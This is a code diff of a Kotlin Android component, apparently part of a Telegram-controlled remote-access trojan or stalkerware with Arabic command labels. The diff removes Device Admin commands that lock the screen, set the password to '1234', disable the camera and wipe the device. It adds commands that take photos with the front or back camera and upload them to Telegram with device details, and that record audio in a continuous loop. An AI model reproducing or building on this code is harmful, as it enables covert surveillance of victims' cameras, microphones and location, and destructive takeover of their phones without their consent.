@@ -7,8 +7,6 @@ import java.io.File
 
 object CommandExecutor {
 
-    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()
-
     fun handle(ctx: Context, callbackData: String, callbackId: String) {
         TelegramApi.answerCallback(callbackId)
         Log.d("CmdExec", "callback: $callbackData")
@@ -44,14 +42,13 @@ object CommandExecutor {
             // الموقع
             cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)
 
-            // Device Admin
-            cmd == "🛡 تفعيل Admin" || cmd == "/admin" -> enableAdmin(ctx)
-            cmd == "🛡 معلومات Admin" || cmd == "/admin_info" -> adminInfo(ctx)
-            cmd == "🔒 قفل الشاشة" || cmd == "/lock" -> lockScreen(ctx)
-            cmd == "📷 تعطيل الكاميرا" || cmd == "/disable_camera" -> disableCamera(ctx)
-            cmd == "/wipe" -> wipeDevice(ctx)
-            cmd == "/enable_camera" -> enableCamera(ctx)
-            cmd == "/password" -> setPassword(ctx, "1234")
+            // الكاميرا
+            cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
+            cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
+
+            // تسجيل صوتي
+            cmd == "🎤 بدء التسجيل" || cmd == "/audio_start" -> startAudio(ctx)
+            cmd == "⏹ إيقاف التسجيل" || cmd == "/audio_stop" -> stopAudio(ctx)
 
             // تيك توك
             cmd == "🎵 تيك توك" || cmd == "/tiktok" -> tiktokOpen(ctx)
@@ -68,80 +65,6 @@ object CommandExecutor {
                 TelegramApi.sendMessage("❓ أمر غير معروف: $cmd", KeyboardBuilder.replyKeyboard())
             }
         }
-    }
-
-    // ═══════════════════════════════════════════
-    //  DEVICE ADMIN
-    // ═══════════════════════════════════════════
-    private fun enableAdmin(ctx: Context) {
-        if (AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("✅ *Device Admin مفعّل مسبقًا*", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        TelegramApi.sendMessage("🛡 *جاري فتح صفحة تفعيل Admin...*")
-        AdminHelper.requestEnable(ctx)
-    }
-
-    private fun adminInfo(ctx: Context) {
-        val info = AdminHelper.getSecurityInfo(ctx)
-        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
-    }
-
-    private fun lockScreen(ctx: Context) {
-        if (!AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        val ok = AdminHelper.lockScreen(ctx)
-        TelegramApi.sendMessage(
-            if (ok) "🔒 تم قفل الشاشة" else "❌ فشل القفل",
-            KeyboardBuilder.replyKeyboard()
-        )
-    }
-
-    private fun setPassword(ctx: Context, password: String) {
-        if (!AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        val ok = AdminHelper.setPassword(ctx, password)
-        TelegramApi.sendMessage(
-            if (ok) "🔑 تم تغيير كلمة السر" else "❌ فشل التغيير",
-            KeyboardBuilder.replyKeyboard()
-        )
-    }
-
-    private fun wipeDevice(ctx: Context) {
-        if (!AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        TelegramApi.sendMessage("💣 *جاري مسح الجهاز...*", KeyboardBuilder.replyKeyboard())
-        AdminHelper.wipeDevice(ctx)
-    }
-
-    private fun disableCamera(ctx: Context) {
-        if (!AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        val ok = AdminHelper.disableCamera(ctx)
-        TelegramApi.sendMessage(
-            if (ok) "📷 تم تعطيل الكاميرا" else "❌ فشل التعطيل",
-            KeyboardBuilder.replyKeyboard()
-        )
-    }
-
-    private fun enableCamera(ctx: Context) {
-        if (!AdminHelper.isEnabled(ctx)) {
-            TelegramApi.sendMessage("⚠️ فعّل Device Admin أولًا", KeyboardBuilder.replyKeyboard())
-            return
-        }
-        val ok = AdminHelper.enableCamera(ctx)
-        TelegramApi.sendMessage(
-            if (ok) "📷 تم تفعيل الكاميرا" else "❌ فشل",
-            KeyboardBuilder.replyKeyboard()
-        )
     }
 
     // ═══════════════════════════════════════════
@@ -201,6 +124,40 @@ object CommandExecutor {
                 KeyboardBuilder.replyKeyboard()
             )
         }
+    }
+
+    // ═══════════════════════════════════════════
+    //  CAMERA
+    // ═══════════════════════════════════════════
+    private fun captureCamera(ctx: Context, front: Boolean) {
+        runJob(ctx, "cam") {
+            val label = if (front) "أمامية 🤳" else "خلفية 📸"
+            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
+            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
+            if (file != null && file.exists()) {
+                TelegramApi.sendPhoto(file, "📷 صورة ($label) — ${DeviceInfo.getQuickInfo(ctx)}")
+                file.delete()
+            } else {
+                TelegramApi.sendMessage("❌ فشل التصوير — تأكد من صلاحية الكاميرا", KeyboardBuilder.replyKeyboard())
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  AUDIO
+    // ═══════════════════════════════════════════
+    private fun startAudio(ctx: Context) {
+        if (AudioRecorder.isRunning()) {
+            TelegramApi.sendMessage("🎤 شغّال بالفعل")
+            return
+        }
+        AudioRecorder.startLoop(ctx)
+        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.replyKeyboard())
+    }
+
+    private fun stopAudio(ctx: Context) {
+        AudioRecorder.stopLoop(ctx)
+        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
     }
 
     // ═══════════════════════════════════════════
